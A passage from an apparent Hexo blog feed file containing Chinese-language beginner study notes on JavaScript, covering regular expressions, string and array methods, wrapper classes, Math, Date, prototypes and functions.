a正好出现n次(正好出现n次)<br>  a{m,n}  a出现m-n次(m到n次,超出n次数为false(不行))<br>  ab{2,3} （b出现2次行，3次也行,4次则为false(不行)）<br>  a{m,}   a出现m次以上 b{3,} (b出现3次以上)</p><p> ③+ 表示至少出现一次,相当于{1,}<br> ④* 表示0次或多次匹配,相当于{0,}(表示有没有都可以)<br> ⑤? 表示0次或一次匹配,相当于{0,1}(要么没有,要么只有一个，多了就不行了)<br> ⑥^ 表示开头 /^a/ (a开头的) 匹配开头的a<br> ⑦$ 表示结尾 /a$/ (a结尾的) 匹配结尾的a,a后面不能再有内容<br> 如果在正则表达式中同时使用^(表示开头)、$(表示结尾)则要求字符串必须完全符合正则表达式</p><p> ⑧”.” 表示除换行符外的所有字符  “.“来表示普通的”.”(点)<br> 直接写(.)表示除换行符外的所有字符,使用()转义,告诉计算机这就是一个普通的点(.)<br> 在正则表达式中使用\作为转义字符</p><p> ⑨”\“ 两个斜杠表示一个斜杠<br> 注意:使用构造函数创建正则时,由于它的参数是一个字符串,而”&quot;是字符串中的转义字符,如果要使用”&quot;,需要使用”\“来表示</p><h2 id="五、特殊的表示"><a href="#五、特殊的表示" class="headerlink" title="五、特殊的表示"></a>五、特殊的表示</h2><h3 id="1-w和-W"><a href="#1-w和-W" class="headerlink" title="1.\w和\W"></a>1.\w和\W</h3><p> ①\w 表示任意字母、数字、<em>(下划线) [A-z0-9</em>]<br> ②\W 表示除了字母、数字、<em>(下划线) [^A-z0-9</em>]</p><h3 id="2-d和-D"><a href="#2-d和-D" class="headerlink" title="2.\d和\D"></a>2.\d和\D</h3><p> ①\d 表示任意的数字 [0-9]<br> ②\D 表示除了数字 [^0-9]</p><h3 id="3-s和-S"><a href="#3-s和-S" class="headerlink" title="3.\s和\S"></a>3.\s和\S</h3><p> ①\s 表示空格<br> ②\S 表示除了空格(除了空格,有没有其他的字符)</p><h3 id="4-b和-B"><a href="#4-b和-B" class="headerlink" title="4.\b和\B"></a>4.\b和\B</h3><p> ①\b 表示单词边界(是否是一个独立的单词)<br> /\bchild\b/ 加了两个单词边界,独立的单词,前后都不可以挨着其他单词<br> ②\B 表示除了单词边界</p><p>去除开头和结尾的空格<br>var str = ‘      hello        ‘<br>result = str.replace(/^\s*|\s*$/g,’’)</p><p><img src="/js/js113.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三十二篇博客</title>
      <link href="/2021/11/01/di-san-shi-er-pian-bo-ke/"/>
      <url>/2021/11/01/di-san-shi-er-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="学习JavaScript的第十三天-字符串方法"><a href="#学习JavaScript的第十三天-字符串方法" class="headerlink" title="学习JavaScript的第十三天(字符串方法)"></a>学习JavaScript的第十三天(字符串方法)</h1><a id="more"></a><h2 id="一、字符串的相关方法"><a href="#一、字符串的相关方法" class="headerlink" title="一、字符串的相关方法"></a>一、字符串的相关方法</h2><h3 id="1-字符保存"><a href="#1-字符保存" class="headerlink" title="1.字符保存"></a>1.字符保存</h3><p>1.在底层字符串是以字符数组的形式保存的<br>例如: HELLO(字符串) -&gt; [‘H’,’E’,’L’,’L’,’O’]</p><h3 id="2-属性"><a href="#2-属性" class="headerlink" title="2.属性"></a>2.属性</h3><p>length 可以用来获取字符串的长度</p><h3 id="3-方法"><a href="#3-方法" class="headerlink" title="3.方法"></a>3.方法</h3><p>①charAt()<br> 该方法可以返回字符串中指定位置的字符,根据索引来获取指定的字符</p><p>②charCodeAt()<br> 该方法用来获取指定位置字符的字符编码(Unicode编码)</p><p>③String.fromCharCode()<br> 该方法可以根据字符编码去获取字符</p><p>④concat()<br> Ⅰ.该方法可以用来连接两个或多个字符串<br> Ⅱ.作用和”+”一样<br> Ⅲ.该方法对原字符串不会产生影响</p><p>⑤indexOf()<br> Ⅰ.该方法可以检索一个字符串中是否含有指定内容<br> Ⅱ.如果该字符串中含有指定内容,就返回其(该字符)在字符串中第一次出现的索引<br> Ⅲ.如果没有找到指定的内容,则返回-1<br> Ⅳ.可以指定一个第二个参数,指定开始检索的位置索引(从索引为几的位置开始进行检索)</p><p>⑥lastIndexOf()<br> Ⅰ.该方法用法和indexOf()一样,它返回一个指定的字符串值最后出现的位置<br> Ⅱ.不同的是indexOf()是从前往后找,lastIndexOf()从后往前找<br> Ⅲ.也可以指定开始查找的位置</p><p>⑦slice()<br> Ⅰ.可以从字符串中截取指定的内容<br> Ⅱ.不会影响到原字符串,而是将截取内容返回<br> Ⅲ.参数<br>  (1)第一个参数,表示开始位置的索引(包括开始位置,截取到的结果包含该位置的元素)<br>  (2)第二个参数,表示结束位置的索引(不包括结束位置,截取到的结果不包含该位置的元素)<br>   如果省略第二个参数,则会截取到后边所有的<br>  (3)第二个参数也可以传递一个负数作为参数,负数的话将会从后边计算</p><p>⑧substring()<br> Ⅰ.可以用来截取一个字符串,和slice()类似<br> Ⅱ.参数<br>  (1)第一个参数,表示开始位置的索引(包括开始位置,截取到的结果包含该位置的元素)<br>  (2)第二个参数,表示结束位置的索引(不包括结束位置,截取到的结果不包含该位置的元素)<br>  (3)第二个参数不可以传一个负值作为参数,如果传了一个负值,默认使用0<br>  (4)会自动调整参数位置(如果第二个参数小于第一个参数,则会自动交换参数位置)</p><p>⑨substr<br> Ⅰ.该方法用来截取字符串<br> Ⅱ.参数<br>  (1)第一个参数表示截取开始位置的索引<br>  (2)第二个参数表示截取的长度(截取的数量,截取几个元素)</p><p>⑩split()<br> Ⅰ.该方法可以将一个字符串拆分为一个数组<br> Ⅱ.参数<br>  (1)需要一个字符串作为参数,将会根据该字符串去拆分数组<br>  (2)如果传递一个空串作为参数,则会将每个字符都拆分为数组中的一个元素<br> 例如: var Str = ‘abcde’<br>      Str.split(‘’) 结果为 [‘a’,’b’,’c’,’d’,’e’]</p><p>⑩①toUpperCase()<br> Ⅰ.该方法用来将一个字符串转换为大写并返回</p><p>⑩②toLowerCase()<br> Ⅰ.该方法用来将一个字符串转换为小写并返回</p><p><img src="/js/js108.png"><br><img src="/js/js109.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三十一篇博客</title>
      <link href="/2021/10/31/di-san-shi-yi-pian-bo-ke/"/>
      <url>/2021/10/31/di-san-shi-yi-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="学习JavaScript的第十二天-包装类"><a href="#学习JavaScript的第十二天-包装类" class="headerlink" title="学习JavaScript的第十二天(包装类)"></a>学习JavaScript的第十二天(包装类)</h1><a id="more"></a><h2 id="一、包装类"><a href="#一、包装类" class="headerlink" title="一、包装类"></a>一、包装类</h2><p>1.在JS中为我们提供了三个包装类,通过这三个包装类可以将基本数据类型的数据转换为对象</p><h2 id="二、分类"><a href="#二、分类" class="headerlink" title="二、分类"></a>二、分类</h2><p>①String() 可以将基本数据类型的字符串转换为String对象</p><p>②Number() 可以将基本数据类型的数值转换为Number对象</p><p>③Boolean() 可以将基本数据类型的布尔值转换为Boolean对象</p><p> 1.方法和属性只能添加给对象,不能添加给基本数据类型</p><p> 2.当我们对一些基本数据类型的值去调用方法和属性时,浏览器会临时使用包装类将其转换为对象,然后在调用对象的属性和方法。调用完成之后,再将其转换为基本数据类型。</p><p><img src="/js/js107.png"></p><h2 id="三、转换过程"><a href="#三、转换过程" class="headerlink" title="三、转换过程"></a>三、转换过程</h2><p> ①var s = 123<br> ②S = s.toString<br> ③s.hello<br> 在这里(③)添加属性时,浏览器会利用包装类,会将其临时转换为对象,添加完成之后就销毁了<br> ④console.log(s.hello)<br> 此时在读取属性时,浏览器会再次利用包装类将其临时转换为对象,此时读取是新创建的对象和之前的(之前的再添加完成之后就销毁了)不是一个对象,所以读取返回undefined</p>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三十篇博客</title>
      <link href="/2021/10/26/di-san-shi-pian-bo-ke/"/>
      <url>/2021/10/26/di-san-shi-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="学习JavaScript的第十一天-Math对象"><a href="#学习JavaScript的第十一天-Math对象" class="headerlink" title="学习JavaScript的第十一天(Math对象)"></a>学习JavaScript的第十一天(Math对象)</h1><a id="more"></a><h2 id="一、Math"><a href="#一、Math" class="headerlink" title="一、Math"></a>一、Math</h2><p>1.Math和其他的对象不同,它不是一个构造函数,它属于一个工具类,不用创建对象,它里面封装了数学运算相关的属性和方法</p><h2 id="二、方法"><a href="#二、方法" class="headerlink" title="二、方法"></a>二、方法</h2><p>①Math.abs() 可以用来运算一个数的绝对值</p><p>②Math.ceil() 可以对一个数进行向上取整,小数上只要有值,就自动进1</p><p>③Math,floor() 可以对一个数进行向下取整,小数部分会被舍去</p><p>④Math.round() 可以对一个数进行四舍五入取整</p><p>⑤Math.random() 可以用来生成一个0-1之间的随机数,生成一个0-X之间的随机数</p><p>生成一个0-X之间的随机数<br>Math.round(Math.random()*X)</p><p>生成一个X-Y之间的随机数<br>Math.round(Math.random()*(y-x)+x)</p><p>⑥Math.max() 可以从多个数中获取最大值<br>Math.min() 可以从多个数中获取最小值</p><p>⑦Math.pow(x,y) 返回X的Y次幂</p><p>⑧Math.sqrt() 对一个数进行开方运算(开根号)</p><p><img src="/js/js106.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二十九篇博客</title>
      <link href="/2021/09/24/di-er-shi-jiu-pian-bo-ke/"/>
      <url>/2021/09/24/di-er-shi-jiu-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="学习JavaScript的第十天-Date对象"><a href="#学习JavaScript的第十天-Date对象" class="headerlink" title="学习JavaScript的第十天(Date对象)"></a>学习JavaScript的第十天(Date对象)</h1><a id="more"></a><h2 id="1-Date对象"><a href="#1-Date对象" class="headerlink" title="1.Date对象"></a>1.Date对象</h2><p>①在js中使用Date对象来表示一个时间,Date对象用于处理日期和时间</p><p>②创建一个指定的时间对象,需要在构造函数中传递一个表示时间的字符串作为参数</p><p>③Date返回日期的格式: 月份/日/年 时:分:秒</p><h2 id="2-创建Date对象的语法"><a href="#2-创建Date对象的语法" class="headerlink" title="2.创建Date对象的语法"></a>2.创建Date对象的语法</h2><p> var myDate = new Date()</p><h2 id="3-创建Date时-传入设置的时间参数"><a href="#3-创建Date时-传入设置的时间参数" class="headerlink" title="3.创建Date时,传入设置的时间参数"></a>3.创建Date时,传入设置的时间参数</h2><p><img src="/js/jsDate.png"></p><h2 id="4-方法"><a href="#4-方法" class="headerlink" title="4.方法"></a>4.方法</h2><p>①getDate() 从当前日期对象中返回一个月中的某一天(1—31)</p><p>②getDay()  从当前日期对象中返回一周中的某一天(1-6)<br>(0是周日,1-6为周一到周六)</p><p>③getMonth() 从当前日期对象中返回月份(0-11)<br>(0是1月,1-11为2月到12月)</p><p>④getFullYear() 从当前日期对象中返回年份(4位数字)</p><p>⑤getTime() 获取当前日期对象的时间戳</p><p>⑥Date.now() 获取当前时间戳(返回从格林威治标准时间以来经过的秒数)</p><p><img src="/js/js105.png"></p><h2 id="5-时间戳"><a href="#5-时间戳" class="headerlink" title="5.时间戳"></a>5.时间戳</h2><p>Ⅰ.时间戳<br>  时间戳指的是格林威治标准时间的1970年1月1日，0分0时0秒到当前日期所花费的毫秒数(1秒=1000毫秒)</p><p>Ⅱ.计算机底层在保存时间都是使用的时间戳</p>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二十八篇博客</title>
      <link href="/2021/04/05/di-er-shi-ba-pian-bo-ke/"/>
      <url>/2021/04/05/di-er-shi-ba-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="学习JavaScript的第九天-数组"><a href="#学习JavaScript的第九天-数组" class="headerlink" title="学习JavaScript的第九天(数组)"></a>学习JavaScript的第九天(数组)</h1><a id="more"></a><h2 id="1-数组"><a href="#1-数组" class="headerlink" title="1.数组"></a>1.数组</h2><p>1.数组也是一个对象，它和普通对象功能类似，也是用来存储一些值的。</p><p>2.不同的是普通对象是使用字符串作为属性名的，而数组是使用数字来作为索引操作元素的。</p><p>3.索引<br>从0开始的整数<br>数组的存储性能比普通对象要好，在开发中我们经常使用数组来存储一些数据</p><h2 id="2-操作数组"><a href="#2-操作数组" class="headerlink" title="2.操作数组"></a>2.操作数组</h2><h3 id="2-1向数组中添加元素"><a href="#2-1向数组中添加元素" class="headerlink" title="2.1向数组中添加元素"></a>2.1向数组中添加元素</h3><p>语法:数组[索引]=值;</p><h3 id="2-2读取数组中的元素"><a href="#2-2读取数组中的元素" class="headerlink" title="2.2读取数组中的元素"></a>2.2读取数组中的元素</h3><p>语法:数组[索引]<br>如果读取不存在的索引，不会报错，会返回undefined</p><h3 id="2-3获取数组的长度"><a href="#2-3获取数组的长度" class="headerlink" title="2.3获取数组的长度"></a>2.3获取数组的长度</h3><p>语法:数组.length<br>①    对于连续的数组，可以使用length属性来获取数组的长度(元素的个数)</p><p>②    对于非连续的数组，使用length属性获得数组的最大索引+1<br>  尽量不要创建非连续的数组</p><h3 id="2-4修改数组长度"><a href="#2-4修改数组长度" class="headerlink" title="2.4修改数组长度"></a>2.4修改数组长度</h3><p>①如果修改的length小于原来的数组长度，多余的元素会被删除。<br>②如果修改的length大于原来的数组长度，多余的部分会空出来。</p><h3 id="2-5向数组的最后一个位置添加元素"><a href="#2-5向数组的最后一个位置添加元素" class="headerlink" title="2.5向数组的最后一个位置添加元素"></a>2.5向数组的最后一个位置添加元素</h3><p>语法:数组[数组.length]=值;<br>数组.length(相当于最大索引+1)</p><p><img src="/js/js91.png"></p><h2 id="3-数组的字面量"><a href="#3-数组的字面量" class="headerlink" title="3.数组的字面量"></a>3.数组的字面量</h2><p>1.使用字面量创建数组 语法：[ ]</p><p>2.使用字面量创建数组时，可以在创建时指定数组中的元素</p><p>3.使用构造函数创建数组时，也可以同时添加元素，将要添加的元素作为参数传递。(元素之间用逗号隔开)</p><p>4.当创建数组只有一个参数时<br>①    字面量代表的是创建一个数组，数组中有这个元素,这个元素就是参数</p><p>②    构造函数代表的是创建一个长度为多少的数组，这个多少为参数<br>例如参数为6时<br>①数组=[6] ②数组.length=6</p><p>5.数组中的元素可以是任意数据类型</p><p><img src="/js/js92.png"></p><h2 id="4-数组的方法"><a href="#4-数组的方法" class="headerlink" title="4.数组的方法"></a>4.数组的方法</h2><h3 id="4-1-push"><a href="#4-1-push" class="headerlink" title="4.1 push()"></a>4.1 push()</h3><p>①该方法可以向数组的末尾添加一个或多个元素，并返回数组的新的长度。</p><p>②可以将要添加的元素作为方法的参数传递，这样这些元素会自动添加到数组的末尾。</p><p>③该方法会将数组新的长度作为返回值返回</p><h3 id="4-2-pop"><a href="#4-2-pop" class="headerlink" title="4.2 pop()"></a>4.2 pop()</h3><p>①该方法可以删除数组的最后一个元素，并将删除元素作为返回值返回</p><h3 id="4-3-unshift"><a href="#4-3-unshift" class="headerlink" title="4.3 unshift()"></a>4.3 unshift()</h3><p>①向数组开头添加一个或多个元素，并返回新的长度(新的长度会作为返回值返回)</p><p>②向前边加入元素后，其他元素的索引会依次调整</p><h3 id="4-4-shift"><a href="#4-4-shift" class="headerlink" title="4.4 shift()"></a>4.4 shift()</h3><p>①可以删除数组的第一个元素，并将删除元素作为返回值返回</p><p><img src="/js/js93.png"></p><h3 id="4-5-slice"><a href="#4-5-slice" class="headerlink" title="4.5 slice()"></a>4.5 slice()</h3><p>①可以用来从数组中提取指定元素<br>该方法不会改变原数组,而是将截取到的元素封装到一个新数组中返回</p><p>②参数<br>slice(start,end)<br>1.start 截取开始的位置索引,包含开始索引<br>2.end   截取结束的位置索引,不包含结束索引(不包含结束位置这个元素)<br> 第二个参数可以省略不写,此时会截取从开始索引往后的所有元素<br>3.索引可以传递一个负值,如果传递一个负值,则从后往前计算(-1 -&gt; 倒数第一个)</p><p><img src="/js/js96.png"></p><h3 id="4-6-splice"><a href="#4-6-splice" class="headerlink" title="4.6 splice()"></a>4.6 splice()</h3><p>1.可以用于删除数组中的指定元素<br>2.使用splice()会影响到原数组,会将指定元素从原数组中删除,并将删除的元素作为返回值返回<br>3.参数<br> ①第一个参数,表示开始位置的索引<br> ②第二个参数,表示删除元素的数量<br> ③第三个元素及以后,可以传递一些新元素,这些元素将会自动插入到开始位置索引前面</p><p> <img src="/js/js97.png"></p><h3 id="4-7-concat"><a href="#4-7-concat" class="headerlink" title="4.7 concat()"></a>4.7 concat()</h3><p> 1.concat()可以连接两个或多个数组,并将新的数组返回<br> 2.该方法不会对原数组产生影响<br> 3.里面可以写数组,也可以写元素</p><p> <img src="/js/js99.png"></p><h3 id="4-8-join"><a href="#4-8-join" class="headerlink" title="4.8 join()"></a>4.8 join()</h3><p> 1.该方法可以将数组转换为一个字符串<br> 2.该方法不会对原数组产生影响,而是将转换后的字符串作为结果返回<br> 3.在join()中可以指定一个字符串作为参数,这个字符串将会成为数组中元素的连接符<br> 4.如果不指定连接符,默认用逗号作为连接符</p><p> <img src="/js/js100.png"></p><h3 id="4-9-reverse"><a href="#4-9-reverse" class="headerlink" title="4.9 reverse()"></a>4.9 reverse()</h3><p> 1.该方法用来反转数组(前面的去后面,后面的去前面)<br> 2.该方法会直接修改数组</p><p> <img src="/js/js101.png"></p><h3 id="4-10-sort"><a href="#4-10-sort" class="headerlink" title="4.10 sort()"></a>4.10 sort()</h3><p> 1.该方法可以用来对数组中的元素进行排序<br> 2.该方法会影响到原数组,默认会按照Unicode编码进行排序<br> 3.对于纯数字的数组,使用sort()排序时,也会按照Unicode编码进行排序,所以对数字进行排序可能得到错误的结果<br> 4.我们可以自己来指定排序顺序,在sort()中添加一个回调函数,来指定排序规则,回调函数中需要定义两个形参,浏览器会分别使用数组中的元素作为实参去调用函数,使用哪个元素调用不稳定,但是肯定的是在数组中,a一定在b的前边<br> 5.浏览器会根据回调函数的返回值来决定元素的顺序<br>  ①如果返回一个大于0的值,则元素会交换位置<br>  ②如果返回一个小于0的值,则元素位置不变<br>  ③如果返回0,则认为两个元素想等,也不交换位置<br>  ④如果需要升序排列,则返回a-b,如果需要降序排列,则返回b-a</p><p> <img src="/js/js102.png"></p><h2 id="5-数组的遍历"><a href="#5-数组的遍历" class="headerlink" title="5.数组的遍历"></a>5.数组的遍历</h2><p>所谓的遍历数组,就是将数组中的元素取出来</p><p>①使用for进行遍历<br>语法:for(var i=0;i&lt;数组.length;i++){<br>console.log(数组[索引]);<br>}</p><p><img src="/js/js94.png"></p><p>②forEach<br> Ⅰ.forEach()这个方法只支持IE8以上的浏览器IE8及以下，浏览器均不支持该方法，如果需要兼容IE8，尽量不要使用forEach。</p><p> Ⅱ.forEach()方法需要一个函数作为参数,像这种函数,由我们创建但是不由我们调用(由浏览器调用),我们称为回调函数</p><p> Ⅲ.数组中有几个元素就会执行几次,每次执行时,浏览器会将遍历到的元素以实参的形式传递进来，我们可以来定义形参,来读取这些内容</p><p> Ⅳ.浏览器会在回调函数中传递三个参数<br>  ①第一个参数,就是当前正在遍历的元素<br>  ②第二个参数,就是当前正在遍历元素的索引<br>  ③第三个参数,就是正在遍历的数组</p><p> <img src="/js/js95.png"></p><h2 id="6-数组的去重操作"><a href="#6-数组的去重操作" class="headerlink" title="6.数组的去重操作"></a>6.数组的去重操作</h2><p> <img src="/js/js98.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二十七篇博客</title>
      <link href="/2021/04/05/di-er-shi-qi-pian-bo-ke/"/>
      <url>/2021/04/05/di-er-shi-qi-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="学习JavaScript的第八天-原型"><a href="#学习JavaScript的第八天-原型" class="headerlink" title="学习JavaScript的第八天(原型)"></a>学习JavaScript的第八天(原型)</h1><a id="more"></a><h2 id="1-原型对象-原型-prototype"><a href="#1-原型对象-原型-prototype" class="headerlink" title="1.原型对象 原型 prototype"></a>1.原型对象 原型 prototype</h2><p>1.我们每创建一个函数，解析器都会向函数中添加一个属性prototype,这个属性对应着一个对象，这个对象就是原型对象。</p><p>2.①如果函数作为普通函数调用prototype没有任何作用</p><p>②当函数以构造函数的形式调用时，它所创建的对象中都有一个隐含属性，指向构造函数的原型对象，<br>我们可以通过<strong>(两个下划线)proto</strong>(两个下划线)来访问该属性。</p><p>3.原型对象就相当于一个公共的区域,所有同一个类的实例都可以访问这个原型对象，我们可以将对象中共有的部分，统一设置到原型对象中。</p><p>4.当我们访问对象的一个属性或方法时<br>①它会先在对象自身寻找，如果有就直接使用。<br>②如果没有则会去原型对象中寻找，找到则直接使用</p><p>5.以后我们创建构造函数时，可以将这些对象共有的属性和方法，统一添加到构造函数的原型对象中，这样不用分别为每一个对象添加，也不会影响到全局作用域，就可以使每个对象都具有这些属性和方法。</p><p><img src="/js/js87.png"><br><img src="/js/js88.png"></p><p>6.原型对象也是对象，所以它也有原型</p><p>当我们使用对象的一个方法或属性时，会先在自身中寻找，自身中如果有，则直接使用。</p><p>如果没有则去原型对象中寻找，如果原型对象中有，则使用。</p><p>如果没有则去原型的原型中寻找，直至找到object对象的原型。<br>Object对象的原型没有原型，如果在object中依然没有找到则返回undefined。</p><h2 id="2-hasOwnProperty"><a href="#2-hasOwnProperty" class="headerlink" title="2.hasOwnProperty"></a>2.hasOwnProperty</h2><p>使用对象的hasOwnProperty()来检查对象自身中是否含有该属性，使用该方法只有自身中含有该属性才会返回true。</p><p><img src="/js/js89.png"></p><h2 id="3-toString"><a href="#3-toString" class="headerlink" title="3.toString()"></a>3.toString()</h2><p>当我们在页面中直接打印一个对象时，实际上输出的对象的toString()方法的返回值</p><p><img src="/js/js90.png"></p><h2 id="4-垃圾回收"><a href="#4-垃圾回收" class="headerlink" title="4.垃圾回收"></a>4.垃圾回收</h2><p>1.程序运行过程中会产生垃圾，这些垃圾积攒过多以后，会导致程序运行的速度过慢，所以我们需要一个垃圾回收的机制，<br>来处理程序运行过程中产生的垃圾。</p><p>2.当一个对象没有任何的变量或属性对它引用时，此时我们将永远无法操作该对象，此时这种对象就是一个垃圾，这种对象过多会占用大量内存空间，导致程序运行变慢，所以必须清理。</p><p>3.在JS中拥有自动垃圾回收机制，会自动将这些垃圾从内存中销毁，我们不需要进行垃圾回收操作。我们做的是将不再使用的对象设置为null即可。</p>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二十六篇博客</title>
      <link href="/2021/04/05/di-er-shi-liu-pian-bo-ke/"/>
      <url>/2021/04/05/di-er-shi-liu-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="学习JavaScript的第七天-函数"><a href="#学习JavaScript的第七天-函数" class="headerlink" title="学习JavaScript的第七天(函数)"></a>学习JavaScript的第七天(函数)</h1><a id="more"></a><h2 id="1-函数-function"><a href="#1-函数-function" class="headerlink" title="1.函数(function)"></a>1.函数(function)</h2><p>1.函数也是一个对象<br>2.函数可以封装一些功能(代码),在需要时执行功能(代码),函数可以保存一些代码在需要时调用<br>3.使用typeof检查函数对象时，返回一个function<br>4.可以将要封装的代码以字符串的形式传递给构造函数,封装到对象中的代码不会立即执行，函数中封装的代码在调用函数时执行<br><img src="/js/js67.png"></p><h2 id="2-函数的调用"><a href="#2-函数的调用" class="headerlink" title="2.函数的调用"></a>2.函数的调用</h2><p>语法:函数对象()<br>当调用函数时，函数中的代码会按照顺序执行</p><h2 id="3-函数创建"><a href="#3-函数创建" class="headerlink" title="3.函数创建"></a>3.函数创建</h2><p>1.使用函数声明来创建函数<br>语法:function 函数名([形参1，形参2……]){<br>    语句……<br>}<br><a href="%E8%A1%A8%E7%A4%BA%E5%8F%AF%E9%80%89%E7%9A%84%EF%BC%8C%E5%8F%AF%E5%86%99%E5%8F%AF%E4%B8%8D%E5%86%99"> </a></p><p><img src="/js/js68.png"></p><p>2.使用函数表达式来创建函数(声明一个匿名函数赋值给一个变量)<br>语法:var 函数名=function([形参1，形参2……]){<br>      语句……<br>}</p><p><img src="/js/js69.png"></p><h2 id="4-函数的参数"><a href="#4-函数的参数" class="headerlink" title="4.函数的参数"></a>4.函数的参数</h2><p>1.可以在函数的()中定义一个或多个形参(形式参数)<br>多个形参之间用逗号(,)隔开，声明形参就相当于在函数内部声明了对应的变量，但是并不赋值</p><p>2.在调用函数时，可以在()中指定实参(实际参数),实参将会赋值给函数中对应的形参</p><p>3.调用函数时解析器不会检查实参的类型，所以要注意是否会接收到非法参数，如果有可能则需要检查参数类型。</p><p>4.函数的实参可以是任意的数据类型，也可以是一个对象<br>当我们的参数过多时，可以将参数封装到一个对象中，然后通过对象传递</p><p>5.调用函数时，解析器将不会检查实参的数量,多余实参将不会被赋值<br>如果实参的数量少于形参的数量，没有对应的形参将为undefiend</p><p><img src="/js/js70.png"></p><p>6.实参可以是一个对象，也可以是一个函数<br>例如：<br>mj()与mj的区别<br>mj() 调用函数，相当于使用函数的返回值<br>mj 函数对象，相当于直接使用对象本身(将mj函数对象作为返回值返回)</p><p><img src="/js/js72.png"></p><h2 id="5-函数的返回值"><a href="#5-函数的返回值" class="headerlink" title="5.函数的返回值"></a>5.函数的返回值</h2><h3 id="5-1返回值"><a href="#5-1返回值" class="headerlink" title="5.1返回值"></a>5.1返回值</h3><p>1.可以使用return来设置函数的返回值</p><p>2.语法:return 值<br>return后的值将会作为函数的执行结果返回<br>可以定义一个变量来接收执行结果</p><p>3.return后的语句都不会执行</p><p>4.如果return语句后不跟任何值就相当于返回一个undefined。如果函数中不写return，也会返回undefined</p><p>5.return后可以跟任意类型的值<br><img src="/js/js71.png"></p><h3 id="5-2返回值类型"><a href="#5-2返回值类型" class="headerlink" title="5.2返回值类型"></a>5.2返回值类型</h3><p>返回值可以是任意数据类型，可以是一个函数，也可以是一个对象。</p><p><img src="/js/js73.png"></p><h2 id="6-函数的方法"><a href="#6-函数的方法" class="headerlink" title="6.函数的方法"></a>6.函数的方法</h2><h3 id="1-call和apply"><a href="#1-call和apply" class="headerlink" title="1.call和apply"></a>1.call和apply</h3><p> ①这两个方法都是函数对象的方法,需要通过函数对象来调用<br> (fun()这个是函数返回值,fun是函数对象)</p><p> ②当对函数调用call()和apply(),都会调用函数执行<br> (函数调用这两个方法都会执行函数)</p><p> ③在调用call()和apply()可以将一个对象指定为方法的第一个参数,此时这个对象将会成为函数执行时的this(call和apply中第一个参数传递的是谁,谁就是函数执行时的this)</p><p> ④call()方法可以将实参在对象之后依次传递<br> 函数.call(传递对象,实参…)</p><p> ⑤apply()方法需要将实参封装到一个数组中统一传递<br> 函数.apply(指定对象,[实参…])</p><p> ⑥使用call和apply调用时,this是指定的那个对象</p><p><img src="/js/js103.png"></p><h2 id="7-立即执行函数"><a href="#7-立即执行函数" class="headerlink" title="7.立即执行函数"></a>7.立即执行函数</h2><p>1.函数定义完，立即被调用,这种函数叫立即执行函数<br>立即执行函数往往只执行一次</p><p><img src="/js/js74.png"></p><h2 id="8-构造函数"><a href="#8-构造函数" class="headerlink" title="8.构造函数"></a>8.构造函数</h2><p>1.构造函数就是一个普通函数，创建方式和普通函数没有区别，不同的是构造函数习惯上首字母大写。</p><p>2.构造函数和普通函数的区别是调用方式的不同<br>普通函数直接调用，构造函数需要使用new关键字来调用</p><p>3.构造函数的流程<br>①创建一个新的对象<br>②将新建的对象设置为函数中的this,在构造函数中可以使用this来引用新建的对象。<br>③逐行执行函数中的代码<br>④将新建对象作为返回值返回</p><p>4.使用同一个构造函数创建的对象，我们称为一类对象，也将一个构造函数称为一个类。<br>我们通过一个构造函数创建的对象，称为是该类的实例。</p><p>5.this的几种情况<br>①当以函数的形式调用时，this是window<br>②当以方法的形式调用时，谁调用方法this就是谁<br>③当以构造函数的形式调用时，this就是那个新创建的对象</p><p>6.instanceof<br>1.使用instanceof可以检查一个对象是否是一个类的实例</p><p>2.语法：对象 instanceof 构造函数<br>如果是返回true，不是返回false</p><p>3.所有对象都是Object的后代，所以任何对象和Object做instanceof检查时，都返回true。</p><p><img src="/js/js84.png"></p><p>构造函数修改<br><img src="/js/js85.png"><br><img src="/js/js86.png"></p><h2 id="9-方法"><a href="#9-方法" class="headerlink" title="9.方法"></a>9.方法</h2><p>1.对象的属性值可以是任何的数据类型，也可以是一个函数。</p><p>2.函数也可以称为对象的属性，如果一个函数作为一个对象的属性保存，那么我们称这个函数是这个对象的方法，调用这个函数也可以说是调用对象的方法(method)。</p><h2 id="10-作用域"><a href="#10-作用域" class="headerlink" title="10.作用域"></a>10.作用域</h2><p>作用域指一个变量的作用的范围<br>在JS中一共有两种作用域:全局作用域和函数作用域</p><h3 id="10-1全局作用域"><a href="#10-1全局作用域" class="headerlink" title="10.1全局作用域"></a>10.1全局作用域</h3><p>①直接编写在script标签内部的JS代码,都在全局作用域</p><p>②全局作用域在页面打开时创建，页面关闭时销毁</p><p>③在全局作用域中有一个全局对象window<br>它代表的是一个浏览器的窗口,它由浏览器创建，我们可以直接使用。</p><p>④在全局作用域中:<br>1.创建的变量都会作为window对象的属性保存<br>2.创建的函数都会作为window对象的方法保存</p><p>⑤全局作用域中的变量都是全局变量，在页面的任意部分都可以访问到。</p><p><img src="/js/js77.png"></p><h3 id="10-2函数作用域"><a href="#10-2函数作用域" class="headerlink" 